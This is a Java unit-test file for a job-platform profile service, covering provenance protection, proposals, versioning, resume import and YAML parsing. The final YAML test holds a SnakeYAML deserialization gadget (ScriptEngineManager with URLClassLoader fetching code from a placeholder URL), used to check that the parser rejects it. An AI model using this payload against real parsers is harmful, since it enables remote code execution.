package com.jobgenie.userservice.profile;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyLong;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.stream.Collectors;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.web.client.RestTemplate;

import com.jobgenie.shared.entities.AuditLog;
import com.jobgenie.shared.exception.JobGenieException;
import com.jobgenie.userservice.profile.CandidateProfileService.ChangeResult;
import com.jobgenie.userservice.profile.CandidateProfileService.Outcome;
import com.jobgenie.userservice.repository.AuditLogRepository;

class CandidateProfileServiceTest {

  private static final Long USER = 7L;

  private final Map<Long, CandidateProfile> profileStore = new HashMap<>();
  private final List<ProfileVersion> versionStore = new ArrayList<>();
  private final List<ProfileProposal> proposalStore = new ArrayList<>();
  private final List<AuditLog> auditStore = new ArrayList<>();

  private CandidateProfileService service;

  @BeforeEach
  @SuppressWarnings("unchecked")
  void setUp() {
    ProfileRepositories.Profiles profiles = mock(ProfileRepositories.Profiles.class);
    when(profiles.findByUserId(anyLong()))
        .thenAnswer(call -> Optional.ofNullable(profileStore.get(call.<Long>getArgument(0))));
    when(profiles.save(any(CandidateProfile.class)))
        .thenAnswer(
            call -> {
              CandidateProfile saved = call.getArgument(0);
              profileStore.put(saved.getUserId(), saved);
              return saved;
            });

    ProfileRepositories.Versions versions = mock(ProfileRepositories.Versions.class);
    when(versions.save(any(ProfileVersion.class)))
        .thenAnswer(
            call -> {
              versionStore.add(call.getArgument(0));
              return call.getArgument(0);
            });
    when(versions.findByUserIdAndVersion(anyLong(), org.mockito.ArgumentMatchers.anyInt()))
        .thenAnswer(
            call ->
                versionStore.stream()
                    .filter(
                        v ->
                            v.getUserId().equals(call.getArgument(0))
                                && v.getVersion() == (int) call.getArgument(1))
                    .findFirst());
    when(versions.findByUserIdOrderByVersionDesc(anyLong()))
        .thenAnswer(
            call ->
                versionStore.stream()
                    .filter(v -> v.getUserId().equals(call.getArgument(0)))
                    .sorted((a, b) -> b.getVersion() - a.getVersion())
                    .collect(Collectors.toList()));

    ProfileRepositories.Proposals proposals = mock(ProfileRepositories.Proposals.class);
    when(proposals.save(any(ProfileProposal.class)))
        .thenAnswer(
            call -> {
              ProfileProposal saved = call.getArgument(0);
              if (saved.getId() == null) {
                saved.setId((long) proposalStore.size() + 1);
                proposalStore.add(saved);
              }
              return saved;
            });
    when(proposals.findById(anyLong()))
        .thenAnswer(
            call ->
                proposalStore.stream()
                    .filter(p -> p.getId().equals(call.getArgument(0)))
                    .findFirst());
    when(proposals.findByUserIdAndStatusOrderByCreatedAtDesc(anyLong(), eq(ProfileProposal.Status.PENDING)))
        .thenAnswer(
            call ->
                proposalStore.stream()
                    .filter(
                        p ->
                            p.getUserId().equals(call.getArgument(0))
                                && p.getStatus() == ProfileProposal.Status.PENDING)
                    .collect(Collectors.toList()));

    AuditLogRepository audit = mock(AuditLogRepository.class);
    when(audit.save(any(AuditLog.class)))
        .thenAnswer(
            call -> {
              auditStore.add(call.getArgument(0));
              return call.getArgument(0);
            });

    service = new CandidateProfileService(profiles, versions, proposals, audit);
  }

  private Map<String, Object> fact(String field) {
    return profileStore.get(USER).getFacts().get(field);
  }

  private int version() {
    return profileStore.get(USER).getCurrentVersion();
  }

  // ------------------------------------------------------------ the invariant

  @Test
  void softwareCanNeverWriteAFactOrAnApprovedValue() {
    for (Provenance forbidden : new Provenance[] {Provenance.FACT, Provenance.USER_APPROVED, null}) {
      JobGenieException error =
          assertThrows(
              JobGenieException.class,
              () ->
                  service.setByAgent(
                      USER, "identity.fullName", "Asha Rao", forbidden, "resume:1", 0.9, "x"));
      assertEquals("PROVENANCE_FORBIDDEN", error.getErrorCode());
    }
    assertTrue(profileStore.isEmpty() || profileStore.get(USER).getFacts().isEmpty());
  }

  @Test
  void inferredValuesStayUnverified() {
    ChangeResult result =
        service.setByAgent(USER, "skills", List.of("Java", "Spring Boot"), Provenance.INFERRED, "resume:1", 0.6, "import");

    assertEquals(Outcome.APPLIED, result.getOutcome());
    assertEquals("INFERRED", fact("skills").get("provenance"));
    assertEquals(false, fact("skills").get("verifiedByUser"));
    assertEquals("resume:1", fact("skills").get("source"));
    assertEquals(0.6, (double) fact("skills").get("confidence"), 1e-9);
  }

  @Test
  void aStatedFactIsNeverOverwrittenByAnAgent() {
    service.setByUser(USER, "preferences.noticePeriod", "30 days", "typed in");
    int before = version();

    ChangeResult result =
        service.setByAgent(
            USER, "preferences.noticePeriod", "immediate", Provenance.AI_GENERATED, "llm", 0.4, "guess");

    assertEquals(Outcome.PROPOSED, result.getOutcome());
    assertEquals("30 days", fact("preferences.noticePeriod").get("value"));
    assertEquals("FACT", fact("preferences.noticePeriod").get("provenance"));
    assertEquals(before, version(), "a proposal must not create a profile version");
    assertEquals(1, service.pendingProposals(USER).size());
  }

  @Test
  void anApprovedValueIsAlsoProtected() {
    service.setByAgent(USER, "contact.phone", "111", Provenance.INFERRED, "resume:1", 0.6, "i");
    service.approve(USER, "contact.phone");

    ChangeResult result =
        service.setByAgent(USER, "contact.phone", "222", Provenance.INFERRED, "resume:2", 0.6, "i");

    assertEquals(Outcome.PROPOSED, result.getOutcome());
    assertEquals("111", fact("contact.phone").get("value"));
  }

  @Test
  void theSameProposalIsNotRaisedTwice() {
    service.setByUser(USER, "location.current", "Pune", null);
    ChangeResult first = service.setByAgent(USER, "location.current", "Mumbai", Provenance.INFERRED, "resume:1", 0.6, "i");
    ChangeResult second = service.setByAgent(USER, "location.current", "Mumbai", Provenance.INFERRED, "resume:1", 0.6, "i");

    assertEquals(first.getProposalId(), second.getProposalId());
    assertEquals(1, service.pendingProposals(USER).size());
  }

  @Test
  void anInferenceMayBeReplacedByAFresherInferenceButNotPromoted() {
    service.setByAgent(USER, "skills", List.of("Java"), Provenance.INFERRED, "resume:1", 0.6, "i");
    service.setByAgent(USER, "skills", List.of("Java", "Kafka"), Provenance.INFERRED, "resume:2", 0.6, "i");

    assertEquals(List.of("Java", "Kafka"), fact("skills").get("value"));
    assertEquals("INFERRED", fact("skills").get("provenance"));
    assertEquals(false, fact("skills").get("verifiedByUser"));
  }

  @Test
  void onlyAUserActionTurnsAnInferenceIntoUserApproved() {
    service.setByAgent(USER, "identity.headline", "Backend Engineer", Provenance.AI_GENERATED, "llm", 0.5, "draft");

    service.approve(USER, "identity.headline");

    assertEquals("USER_APPROVED", fact("identity.headline").get("provenance"));
    assertEquals(true, fact("identity.headline").get("verifiedByUser"));
    assertEquals("Backend Engineer", fact("identity.headline").get("value"));
    assertEquals("user", versionStore.get(versionStore.size() - 1).getAuthor());
  }

  // --------------------------------------------------------------- proposals

  @Test
  void approvingAProposalAppliesItAsUserApproved() {
    service.setByUser(USER, "location.current", "Pune", null);
    Long id = service.setByAgent(USER, "location.current", "Mumbai", Provenance.INFERRED, "resume:1", 0.6, "i").getProposalId();

    service.decideProposal(USER, id, true);

    assertEquals("Mumbai", fact("location.current").get("value"));
    assertEquals("USER_APPROVED", fact("location.current").get("provenance"));
    assertTrue(service.pendingProposals(USER).isEmpty());
  }

  @Test
  void rejectingAProposalLeavesTheProfileAlone() {
    service.setByUser(USER, "location.current", "Pune", null);
    Long id = service.setByAgent(USER, "location.current", "Mumbai", Provenance.INFERRED, "resume:1", 0.6, "i").getProposalId();
    int before = version();

    service.decideProposal(USER, id, false);

    assertEquals("Pune", fact("location.current").get("value"));
    assertEquals(before, version());
    assertThrows(JobGenieException.class, () -> service.decideProposal(USER, id, true));
  }

  @Test
  void aUserCannotDecideSomeoneElsesProposal() {
    service.setByUser(USER, "location.current", "Pune", null);
    Long id = service.setByAgent(USER, "location.current", "Mumbai", Provenance.INFERRED, "resume:1", 0.6, "i").getProposalId();

    JobGenieException error = assertThrows(JobGenieException.class, () -> service.decideProposal(99L, id, true));

    assertEquals("PROPOSAL_NOT_FOUND", error.getErrorCode());
    assertEquals("Pune", fact("location.current").get("value"));
  }

  // ---------------------------------------------------------------- versions

  @Test
  void everyAcceptedChangeIsAVersionAndAnAuditRecordWithBeforeAndAfter() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", "first");
    service.setByUser(USER, "identity.fullName", "Asha R. Rao", "corrected");

    assertEquals(2, version());
    assertEquals(2, service.versions(USER).size());
    assertEquals("Asha Rao", ((Map<?, ?>) versionStore.get(0).getSnapshot().get("identity.fullName")).get("value"));
    assertEquals("Asha R. Rao", ((Map<?, ?>) versionStore.get(1).getSnapshot().get("identity.fullName")).get("value"));
    String details = auditStore.get(auditStore.size() - 1).getDetails();
    assertTrue(details.contains("\"before\"") && details.contains("Asha Rao") && details.contains("Asha R. Rao"), details);
    assertTrue(details.contains("\"reason\":\"corrected\""), details);
  }

  @Test
  void savingTheSameFactAgainIsNotANewVersion() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", null);
    ChangeResult again = service.setByUser(USER, "identity.fullName", "Asha Rao", null);

    assertEquals(Outcome.UNCHANGED, again.getOutcome());
    assertEquals(1, version());
  }

  @Test
  void rollbackRestoresAnEarlierStateAsANewVersionAndKeepsHistory() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", null); // v1
    service.setByUser(USER, "preferences.noticePeriod", "30 days", null); // v2
    service.setByUser(USER, "preferences.noticePeriod", "60 days", null); // v3

    int now = service.rollback(USER, 2);

    assertEquals(4, now);
    assertEquals("30 days", fact("preferences.noticePeriod").get("value"));
    assertEquals(4, service.versions(USER).size());
    assertEquals(
        "60 days",
        ((Map<?, ?>) versionStore.get(2).getSnapshot().get("preferences.noticePeriod")).get("value"),
        "the rolled-back-from version must be untouched");
    assertEquals("Rolled back to v2", versionStore.get(3).getReason());
  }

  @Test
  void rollbackToAMissingVersionFails() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", null);
    assertEquals("VERSION_NOT_FOUND", assertThrows(JobGenieException.class, () -> service.rollback(USER, 9)).getErrorCode());
  }

  @Test
  void versionSnapshotsAreIndependentOfLaterEdits() {
    service.setByUser(USER, "skills", new ArrayList<>(List.of("Java")), null);
    service.setByUser(USER, "skills", new ArrayList<>(List.of("Java", "Go")), null);

    assertEquals(List.of("Java"), ((Map<?, ?>) versionStore.get(0).getSnapshot().get("skills")).get("value"));
  }

  // ------------------------------------------------------------- validation

  @Test
  void unknownFieldsAndWrongShapesAreRejectedAndStoreNothing() {
    assertThrows(JobGenieException.class, () -> service.setByUser(USER, "bank.account", "123", null));
    assertThrows(JobGenieException.class, () -> service.setByUser(USER, "skills", "Java", null));
    assertThrows(JobGenieException.class, () -> service.setByUser(USER, "identity.fullName", List.of("a"), null));
    assertThrows(JobGenieException.class, () -> service.setByUser(USER, "preferences.salaryExpectation", "10", null));
    assertTrue(profileStore.isEmpty() || profileStore.get(USER).getCurrentVersion() == 0);
  }

  @Test
  void viewListsWhatIsStillMissingForApplications() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", null);
    service.setByUser(USER, "contact.email", ProfileSchema.USER_INPUT_REQUIRED, null);

    @SuppressWarnings("unchecked")
    List<String> missing = (List<String>) service.view(USER).get("missingRequired");

    assertFalse(missing.contains("identity.fullName"));
    assertTrue(missing.contains("contact.email"), "the placeholder counts as missing");
    assertTrue(missing.contains("preferences.noticePeriod"));
  }

  // ---------------------------------------------------------- resume import

  @Test
  void resumeImportRecordsInferencesAndRaisesProposalsForConflicts() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", null);
    RestTemplate rest = mock(RestTemplate.class);
    Map<String, Object> resume = new HashMap<>();
    resume.put("id", 5);
    resume.put("isActive", true);
    resume.put("skills", List.of("Java", " ", "Spring Boot"));
    resume.put("experience", List.of(Map.of("company", "Acme"), "Built things at Beta"));
    resume.put("education", List.of());
    resume.put("metadata", Map.of("personal_info", Map.of("name", "A. Rao", "email", "asha@example.com")));
    when(rest.getForObject(any(String.class), eq(List.class))).thenReturn(List.of(resume));
    ProfileImportService importer = new ProfileImportService(service, rest);
    ReflectionTestUtils.setField(importer, "resumeServiceUrl", "http://resume-service:8083");

    Map<String, Object> summary = importer.importFromResume(USER);

    assertEquals(1, summary.get("proposed"), "the stated name differs from the resume's");
    assertEquals("Asha Rao", fact("identity.fullName").get("value"));
    assertEquals("INFERRED", fact("contact.email").get("provenance"));
    assertEquals("resume:5", fact("contact.email").get("source"));
    assertEquals(List.of("Java", "Spring Boot"), fact("skills").get("value"));
    @SuppressWarnings("unchecked")
    List<Map<String, Object>> experience = (List<Map<String, Object>>) fact("experience").get("value");
    assertEquals("Built things at Beta", experience.get(1).get("description"));
    assertEquals(null, profileStore.get(USER).getFacts().get("education"), "empty sections are not recorded");
  }

  @Test
  void resumeImportWithoutAResumeSaysSo() {
    RestTemplate rest = mock(RestTemplate.class);
    when(rest.getForObject(any(String.class), eq(List.class))).thenReturn(List.of());
    ProfileImportService importer = new ProfileImportService(service, rest);
    ReflectionTestUtils.setField(importer, "resumeServiceUrl", "http://resume-service:8083");

    assertEquals("NO_RESUME", assertThrows(JobGenieException.class, () -> importer.importFromResume(USER)).getErrorCode());
  }

  // -------------------------------------------------------------------- YAML

  @Test
  void yamlRoundTripsAndPlaceholdersAreSkippedOnImport() {
    service.setByUser(USER, "identity.fullName", "Asha Rao", null);
    service.setByUser(USER, "skills", List.of("Java", "Go"), null);
    @SuppressWarnings("unchecked")
    String yaml = ProfileYaml.export(version(), (Map<String, Map<String, Object>>) service.view(USER).get("facts"));

    assertTrue(yaml.contains("USER_INPUT_REQUIRED"), "fields never filled in are marked as such");
    ProfileYaml.Parsed parsed = ProfileYaml.parse(yaml);

    assertTrue(parsed.errors.isEmpty(), parsed.errors.toString());
    assertEquals(2, parsed.entries.size());
    assertEquals("FACT", parsed.entries.stream().filter(e -> e.field.equals("skills")).findFirst().get().claimedProvenance.name());
  }

  @Test
  void aFileCannotClaimToBeFactUnlessTheUserConfirmsIt() {
    String yaml = "profile:\n  contact:\n    email:\n      value: asha@example.com\n      provenance: FACT\n";
    RestTemplate rest = mock(RestTemplate.class);
    ProfileImportService importer = new ProfileImportService(service, rest);

    importer.importYaml(USER, yaml, false);
    assertEquals("INFERRED", fact("contact.email").get("provenance"));
    assertEquals(false, fact("contact.email").get("verifiedByUser"));

    importer.importYaml(USER, yaml, true);
    assertEquals("FACT", fact("contact.email").get("provenance"));
    assertEquals(true, fact("contact.email").get("verifiedByUser"));
  }

  @Test
  void bareValuesAreAccepted() {
    ProfileYaml.Parsed parsed = ProfileYaml.parse("profile:\n  identity:\n    fullName: Asha Rao\n  skills: [Java, Go]\n");

    assertTrue(parsed.errors.isEmpty(), parsed.errors.toString());
    assertEquals(2, parsed.entries.size());
  }

  @Test
  void badYamlIsReportedNotExecuted() {
    assertFalse(ProfileYaml.parse("profile:\n  bank:\n    iban: X\n").errors.isEmpty());
    assertFalse(ProfileYaml.parse("profile:\n  skills: not-a-list\n").errors.isEmpty());
    assertFalse(ProfileYaml.parse("not: [valid").errors.isEmpty());
    assertFalse(ProfileYaml.parse("").errors.isEmpty());
    // A type tag that would instantiate a Java class under SnakeYAML's default constructor.
    ProfileYaml.Parsed hostile =
        ProfileYaml.parse("profile:\n  identity:\n    fullName: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x\"]]]]\n");
    assertFalse(hostile.errors.isEmpty());
    assertTrue(hostile.entries.isEmpty());
    assertFalse(ProfileYaml.parse("profile:\n  identity:\n    fullName: " + "x".repeat(ProfileYaml.MAX_BYTES)).errors.isEmpty());
  }
}
